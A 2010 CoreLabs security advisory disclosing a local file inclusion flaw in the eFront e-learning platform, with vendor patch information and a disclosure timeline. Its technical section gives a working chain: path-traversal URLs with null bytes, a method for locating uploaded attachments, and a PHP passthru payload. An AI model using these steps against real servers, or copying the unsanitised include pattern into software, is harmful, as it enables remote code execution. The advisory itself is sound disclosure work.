-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
 
      Core Security Technologies - CoreLabs Advisory
              http://www.coresecurity.com/corelabs/

         eFront-learning PHP file inclusion vulnerability



1. *Advisory Information*

Title: eFront-learning PHP file inclusion vulnerability
Advisory Id: CORE-2010-0311
Advisory URL:
http://www.coresecurity.com/content/efront-php-file-inclusion
Date published: 2010-03-16
Date of last update: 2010-03-16
Vendors contacted: Vendor name
Release mode: Coordinated release


2. *Vulnerability Information*

Class: PHP file inclusion [CWE-98]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A
CVE Name: N/A


3. *Vulnerability Description*

eFront [1] is an easy-to-use, open source and object-oriented
multilingual eLearning platform that can be used to build learning
communities, educate and retain the end-users.

eFront is vulnerable to local file inclusion vulnerability, which
allows an external remote attacker to upload an arbitrary file and
execute code on the vulnerable website learning platform.


4. *Vulnerable packages*

   . eFront v3.5.5.
   . Older versions are probably affected too, but they were not checked.


5. *Non-vulnerable packages*

   . eFront v3.6.


6. *Vendor Information, Solutions and Workarounds*

We have issued a patch that addresses this problem, as well as a new
eFront 3.5.5 bundle that includes the fix.

   . Link to the patch:
http://sourceforge.net/projects/efrontlearning/files/efront_3.5.x_editor_security_patch.zip/download.

   . Link to the corresponding forum announcement and discussion:
http://forum.efrontlearning.net/viewtopic.php?f=15&t=1945.
   . Link to the corresponding web site announcement:
http://www.efrontlearning.net/product/efront-news/265-important-security-fix.html.



7. *Credits*

This vulnerability was discovered and researched by 7safe's
Penetration Testing Team, [2].


8. *Technical Description / Proof of Concept Code*

eFront-learning is vulnerable to local file inclusion vulnerability.
The file 'language.php' located in
'/www/editor/tiny_mce/langs/language.php' has the following code:

/-----
include_once $path."language/lang-".$_GET['langname'].".php.inc";
- -----/
 Thus any arbitrary file can be included, using the following attack
vector:

/-----
http://192.168.xxx.xxx/efront/www/editor/tiny_mce/langs/language.php?langname=a/../../../../../../boot.ini%00
- -----/
 Magic quote must be disabled for successful inclusions of files with
extensions other than '.php.inc'.

Further, the software allows files with extension '.php.inc' to be
uploaded on to the server. These files can be uploaded as a user in
student role via 'send-message' functionality (attaching a file with
extension '.php.inc').

/-----
http://192.168.xxx.xxx/efront/www/forum/new_message.php
- -----/
 The attached document gets saved in directory:

/-----
/wwwroot/www/efront/upload/[username]/message_attachments/Sent/[timestamp]/
- -----/
 The value of the directory name '[timestamp]' can be calculated by
passing the date/time of the message sent (can be found in
'Tools->Messages->Sent functionality') as the input parameters to the
PHP function 'mktime()'. For example, 'echo mktime(18, 15, 29, 2, 22,
2010)' gives us 1266862529.

Once the file location of the uploaded file has been obtained, then
remote code can be executed on the vulnerable website by including
this malicious file:

/-----
http://localhost:81/efront/www/editor/tiny_mce/langs/language.php?langname=../../../../upload/student/message_attachments/Sent/1266862529/malicious.php.inc%00
- -----/
 If the malicious file 'malicious.php.ini' would contain following code:

/-----
<?php
   passthru("net users");
?>

- -----/
 Attacker will be able to enumerate users on target machine.


9. *Report Timeline*

. 2010-03-11:
Core Security Technologies notifies the eFront team of the vulnerability.

. 2010-03-12:
The eFront team asks Core for a technical description of the
vulnerability.

. 2010-03-12:
Technical details sent to eFront team by Core. Core notifies that the
flaw was probably fixed in eFront v3.6 (publicly available).

. 2010-03-12:
eFront team confirms the flaw was fixed in v3.6 and they will issue a
patch for versions 3.5.5 and below. eFront team also notifies the
patches for old version will be available next Monday, 2010-Mar-15.

. 2010-03-12:
Core announces its plan to publish the advisory on March 16th, 2010.

. 2010-03-12:
The eFront team notifies that are in agreement with the proposed
disclosure date.

. 2010-03-15:
The eFront team notifies that they have issued a patch that addresses
the problem, as well as a new efront 3.5.5 bundle that includes the
fix (See section 6).

. 2010-03-16:
The advisory CORE-2010-0311 is published.



10. *References*

[1] http://www.efrontlearning.net/.
[2] http://www.7safe.com/.


11. *About CoreLabs*

CoreLabs, the research center of Core Security Technologies, is
charged with anticipating the future needs and requirements for
information security technologies. We conduct our research in several
important areas of computer security including system vulnerabilities,
cyber attack planning and simulation, source code auditing, and
cryptography. Our results include problem formalization,
identification of vulnerabilities, novel solutions and prototypes for
new technologies. CoreLabs regularly publishes security advisories,
technical papers, project information and shared software tools for
public use at: http://www.coresecurity.com/corelabs.


12. *About Core Security Technologies*

Core Security Technologies develops strategic solutions that help
security-conscious organizations worldwide develop and maintain a
proactive process for securing their networks. The company's flagship
product, CORE IMPACT, is the most comprehensive product for performing
enterprise security assurance testing. CORE IMPACT evaluates network,
endpoint and end-user vulnerabilities and identifies what resources
are exposed. It enables organizations to determine if current security
investments are detecting and preventing attacks. Core Security
Technologies augments its leading technology solution with world-class
security consulting services, including penetration testing and
software security auditing. Based in Boston, MA and Buenos Aires,
Argentina, Core Security Technologies can be reached at 617-399-6980
or on the Web at http://www.coresecurity.com.


13. *Disclaimer*

The contents of this advisory are copyright (c) 2010 Core Security
Technologies and (c) 2010 CoreLabs, and may be distributed freely
provided that no fee is charged for this distribution and proper
credit is given.


14. *PGP/GPG Keys*

This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
 
iEYEARECAAYFAkuf7oQACgkQyNibggitWa1eMwCgiOgnlm+9nN8CwDRSLQeDrMPZ
h/4An3ZuSO53NX+GVKaJuEoCMhoNrIsr
=hYGm
-----END PGP SIGNATURE-----
